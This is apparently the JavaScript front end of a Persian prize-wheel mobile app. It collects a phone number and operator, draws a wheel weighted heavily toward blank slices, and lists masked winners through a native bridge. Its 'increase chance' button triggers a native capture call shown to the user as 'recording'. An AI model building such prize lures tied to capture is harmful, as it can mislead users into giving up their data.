'use strict';

const FA = '۰۱۲۳۴۵۶۷۸۹';
const fa = (n) => String(n).replace(/[0-9]/g, (d) => FA[+d]);
const toAscii = (s) => String(s).replace(/[۰-۹]/g, (d) => FA.indexOf(d))
  .replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d));

const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

const NUMRUN = /[0-9۰-۹٠-٩][0-9۰-۹٠-٩.,٫٬%٪]*/g;
const num = (s) => esc(s).replace(NUMRUN, (m) => `<i class="n">${m}</i>`);

const $ = (id) => document.getElementById(id);
const state = { wheelTurn: 0, consented: false };

const PRIZES = [
  { key: 'charge_50', label: '۵۰ هزارتومن شارژ', w: 2, c1: '#1f6f8b', c2: '#144a63' },
  { key: 'charge_100', label: '۱۰۰ هزارتومن شارژ', w: 2, c1: '#5b3fa8', c2: '#3a2a70' },
  { key: 'data_5g', label: '۵ گیگ اینترنت', w: 1, c1: '#2f7d5b', c2: '#1d5340' },
];

const SLICES = [
  { key: 'blank_a', label: 'پوچ', w: 45, c1: '#334155', c2: '#1e293b' },
  { key: 'again', label: 'شانس دوباره', w: 5, c1: '#7c5cff', c2: '#4dd4ff' },
  { key: 'blank_b', label: 'پوچ', w: 45, c1: '#334155', c2: '#1e293b' },
  { key: PRIZES[0].key, label: PRIZES[0].label, w: PRIZES[0].w, c1: PRIZES[0].c1, c2: PRIZES[0].c2 },
  { key: PRIZES[1].key, label: PRIZES[1].label, w: PRIZES[1].w, c1: PRIZES[1].c1, c2: PRIZES[1].c2 },
  { key: PRIZES[2].key, label: PRIZES[2].label, w: PRIZES[2].w, c1: PRIZES[2].c1, c2: PRIZES[2].c2 },
];

const TOTAL = SLICES.reduce((a, s) => a + s.w, 0);
const RING_N = PRIZES.length;
const RING_STEP = 360 / RING_N;

function drawWheel() {
  const stops = [];
  let acc = 0;
  for (const s of SLICES) {
    const from = (acc / TOTAL) * 360;
    acc += s.w;
    const to = (acc / TOTAL) * 360;
    if (s.w > 0) stops.push(`${s.c1} ${from}deg ${to}deg`);
  }
  $('disc').style.background = `conic-gradient(${stops.join(',')})`;

  const ringStops = PRIZES.map((p, i) => {
    const a = i * RING_STEP;
    const b = a + RING_STEP - 2;
    return `${p.c1} ${a}deg ${b}deg`;
  });
  $('prizeRing').style.background =
    `conic-gradient(from -${RING_STEP / 2}deg, ${ringStops.join(',')})`;

  let ringMarks = '';
  for (let i = 0; i < RING_N; i++) {
    const mid = i * RING_STEP + RING_STEP / 2;
    ringMarks += `<i class="wmark" style="--a:${mid}deg"><b>${esc(PRIZES[i].label)}</b></i>`;
  }
  $('prizeRing').innerHTML = ringMarks;

  let discMarks = '';
  let ang = 0;
  for (const s of SLICES) {
    const mid = ang + s.w / 2;
    ang += s.w;
    if (s.w <= 0) continue;
    discMarks += `<i class="wmark" style="--a:${mid}deg"><b>${esc(s.label)}</b></i>`;
  }
  $('disc').innerHTML = discMarks;

  $('wheelHub').textContent =
    fa((PRIZES.reduce((a, p) => a + p.w, 0) / TOTAL) * 100) + '٪';
}

function spinTo(slice) {
  let acc = 0;
  for (const s of SLICES) {
    if (s.key === slice.key) break;
    acc += s.w;
  }
  const mid = acc + slice.w / 2;
  const target = 360 * 5 + (360 - (mid / TOTAL) * 360);
  state.wheelTurn += target - (state.wheelTurn % 360);
  $('disc').style.transform = `rotate(${state.wheelTurn}deg)`;
}

let toastTimer = null;
function toast(msg, tone) {
  const el = $('toast');
  el.innerHTML = num(msg || '');
  el.className = 'toast' + (tone ? ' ' + tone : '');
  el.hidden = false;
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { el.hidden = true; }, 4200);
}

function mask(phone) {
  const d = toAscii(phone).replace(/\D/g, '');
  if (d.length < 6) return esc(d);
  return `${fa(d.slice(0, 3))}******${fa(d.slice(-2))}`;
}

function renderWinners(list) {
  const rows = Array.isArray(list) ? list.slice(0, 8) : [];
  $('winners').innerHTML = rows.map((r) =>
    `<li><span class="who n">${mask(r.phone || '')}</span>
         <span class="what">${num(r.prize || '')}</span></li>`).join('');
}

function human(ms) {
  const s = Math.ceil(ms / 1000);
  if (s < 60) return fa(s) + ' ثانیه';
  const m = Math.ceil(s / 60);
  if (m < 60) return fa(m) + ' دقیقه';
  const h = Math.floor(m / 60);
  const rm = m % 60;
  if (h < 24) return fa(h) + ' ساعت' + (rm ? ' و ' + fa(rm) + ' دقیقه' : '');
  return fa(Math.floor(h / 24)) + ' روز';
}

function renderChance(s) {
  const n = Number(s.chances) || 0;
  $('chanceN').textContent = fa(n);
  $('chanceBar').style.width = Math.min(100, n * 20) + '%';

  const left = Math.max(0, (Number(s.spinReadyAt) || 0) - Number(s.now || 0));
  $('spinIn').textContent = left > 0 ? human(left) : 'آماده';

  const busy = !!s.recording || !!s.busy;
  $('btnSpin').disabled = busy;
  $('btnSpin').textContent = s.recording ? 'در حال ضبط…' : 'افزایش شانس';
  $('btnTurn').disabled = !!s.busy;

  $('btnRegister').disabled = !!s.busy;
  $('btnRegister').textContent = s.busy ? 'در حال انجام…' : 'ثبت شماره';

  $('heroSub').innerHTML = s.registered
    ? num('ثبت شده — ' + (s.lastReport || ''))
    : 'ثبت شماره برای شرکت در مسابقه';
}

const N = (window.Prf = window.Prf || {});
const J = () => window.Native;

N.ready = function () {
  drawWheel();
  let already = false;
  try { already = !!J().consented(); } catch (e) { already = false; }
  if (already) enterApp();
  else $('consent').hidden = false;
};

function enterApp() {
  state.consented = true;
  $('consent').hidden = true;
  $('wrap').hidden = false;
  try {
    $('operator').innerHTML = String(J().operators() || '')
      .split(',').map((o) => o.trim()).filter(Boolean)
      .map((o) => `<option value="${esc(o)}">${esc(o)}</option>`).join('');
    $('operator').value = J().operator() || '';
    $('phone').value = J().phone() || '';
  } catch (e) { }
  N.push();
  setInterval(() => N.push(), 1000);
}

N.push = function () {
  let s = null;
  try {
    const raw = J().state();
    if (raw) s = typeof raw === 'string' ? JSON.parse(raw) : raw;
  } catch (e) { return; }
  if (!s) return;
  renderChance(s);
  if (s.log) toast(s.log, s.logTone);
  try {
    const w = J().winners();
    if (w) renderWinners(typeof w === 'string' ? JSON.parse(w) : w);
  } catch (e) { }
};

N.spin = function (key) {
  const slice = SLICES.find((s) => s.key === key) || SLICES[0];
  spinTo(slice);
};

N.spinResult = function (label, tone) {
  const el = $('result');
  el.innerHTML = num(label || '');
  el.className = 'result' + (tone ? (tone === 'ok' ? '' : ' warn') : '');
};

$('phone').addEventListener('input', (e) => {
  const el = e.target;
  const ascii = toAscii(el.value).replace(/[^\d+]/g, '');
  if (ascii !== el.value) {
    const at = el.selectionStart || 0;
    el.value = ascii;
    const keep = Math.min(ascii.length, at);
    try { el.setSelectionRange(keep, keep); } catch (_) { }
  }
  $('phoneErr').hidden = true;
});

$('operator').addEventListener('change', (e) => J().setOperator(e.target.value));

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-act]');
  if (!b) return;
  const act = b.dataset.act;

  if (act === 'consentYes') { J().consent(true); enterApp(); return; }
  if (act === 'consentNo') { J().consent(false); return; }

  if (act === 'register') {
    const phone = $('phone').value.trim().replace(/^\+98/, '0');
    if (!/^0?9\d{9}$/.test(phone)) {
      $('phoneErr').hidden = false;
      $('phone').focus();
      return;
    }
    J().register(phone, $('operator').value);
    return;
  }

  if (act === 'spin') {
    if ($('btnSpin').disabled) return;
    J().capture();
    return;
  }

  if (act === 'turn') {
    if ($('btnTurn').disabled) return;
    J().turn();
    return;
  }
});
